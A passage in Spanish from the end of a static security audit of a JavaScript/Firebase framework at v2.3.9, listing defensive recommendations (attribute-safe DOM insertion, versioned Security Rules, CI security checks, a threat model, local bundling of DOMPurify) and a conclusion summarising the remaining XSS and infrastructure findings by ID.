2. **Nunca interpolar datos en posición de atributo.** Las correcciones de tipo "validar esquema de URL" (NEW-04/SEC-02) no bastan mientras el valor se inserte por concatenación dentro de comillas. La regla general: contenido → `sanitizeHTML`/`textContent`; atributos → `setAttribute` con DOM API (que neutraliza la ruptura de comillas).

3. **Versionar las Firebase Security Rules.** Es la frontera de seguridad real del proyecto y hoy es invisible al repositorio y a las auditorías. Incluir `database.rules.json` (y reglas de Storage/Firestore si aplican) en control de versiones y en `firebase.json`.

4. **Pipeline CI con análisis automático.** Integrar en cada PR: `npm audit --audit-level=high`, un linter de seguridad (`eslint-plugin-security`), y un grep de sinks (`innerHTML`, `insertAdjacentHTML`, interpolación en atributos) para detectar regresiones de los patrones ya corregidos.

5. **Documentar el modelo de amenazas (`SECURITY.md`).** Declarar explícitamente: qué datos son confiables (i18n estático) y cuáles no (atributos, query params, RTDB); que los *route guards* son UX y no seguridad; que la ofuscación **no** protege secretos; y cuál es la postura ante el bypass de la Regla de Oro.

6. **Reducir dependencia de CDNs de terceros en runtime.** Tanto DOMPurify (jsDelivr) como el SDK de Firebase (gstatic) se cargan sin verificación de integridad. Empaquetar localmente lo crítico para sanitización (DOMPurify) elimina el mayor punto único de fallo de seguridad.

---

## Conclusión

`v2.3.9` confirma una evolución de seguridad sólida: las correcciones de la auditoría anterior (NEW-01, 02, 03, 06, 08, 09, 10) **resistieron la verificación** y la base criptográfica (AES-GCM/PBKDF2) y el router son correctos. La sanitización con DOMPurify está bien configurada (allowlist exhaustiva, sin `style`, sin `data-*`).

No obstante, esta auditoría —al ampliar el alcance a Git, CDN y dependencias— revela que la **superficie de XSS sigue siendo heterogénea**: SEC-02 demuestra que una corrección anterior (NEW-04) quedó incompleta porque valida el esquema pero no el contexto del atributo, y SEC-03/SEC-04 muestran dos componentes que nunca recibieron la sanitización aplicada a sus pares. El patrón de fondo es el mismo señalado en v2.3.7: **la sanitización se aplica componente por componente en lugar de por defecto en la capa de registro**, lo que garantiza que cada componente nuevo es una oportunidad de regresión.

A nivel de infraestructura, los hallazgos más estratégicos son SEC-09 (la seguridad real depende de Security Rules que no están versionadas) y SEC-10 (el bypass binario de la Regla de Oro), porque definen si los controles de acceso del framework son efectivos o meramente cosméticos. SEC-01 cierra el círculo recordando que la ofuscación no es confidencialidad.

Atendiendo las prioridades 1–4 (XSS activos y exposición de credenciales) y, a corto plazo, 5–7 (frontera de confianza, supply chain de sanitización y fail-closed), el framework alcanzaría una postura de seguridad robusta y coherente con el rigor que ya demuestra su proceso de auditoría iterativa.

---

*Informe generado mediante análisis estático de código fuente (white-box), revisión del historial de Git y `npm audit`. No se realizaron pruebas de penetración dinámicas (DAST) ni se auditaron las Firebase Security Rules (no presentes en el repositorio). Se recomienda complementar con la exportación y revisión de dichas reglas (ver SEC-09).*
